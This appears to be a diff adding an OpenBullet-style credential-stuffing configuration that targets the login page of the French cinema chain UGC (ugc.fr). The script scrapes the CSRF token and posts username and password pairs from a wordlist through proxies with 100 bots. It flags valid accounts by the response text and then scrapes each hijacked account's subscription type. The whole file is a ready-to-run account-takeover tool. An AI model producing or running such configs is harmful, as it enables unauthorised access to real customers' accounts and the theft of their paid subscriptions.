@@ -1,0 +1,54 @@
+[SETTINGS]
+{
+  "Name": "UGC",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-02T21:15:50.3814639+02:00",
+  "AdditionalInfo": "",
+  "Author": "ky0ox",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.ugc.fr/login.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"_csrf\" value=\"" "\"/>" -> VAR "TOKEN" 
+REQUEST POST "https://www.ugc.fr/j_spring_security_check" 
+  CONTENT "_csrf=<TOKEN>&j_username=<USER>&j_password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "origin: https://www.ugc.fr" 
+  HEADER "referer: https://www.ugc.fr/login.html" 
+  HEADER "upgrade-insecure-requests: 1" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Compte ou mot de passe non valide" 
+  KEYCHAIN Success OR 
+    KEY "Mes données perso" 
+REQUEST GET "https://www.ugc.fr/profilAbonnement.html" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "<h2 class=\"card-title\">" "</h2>" -> CAP "Abonnement: " 
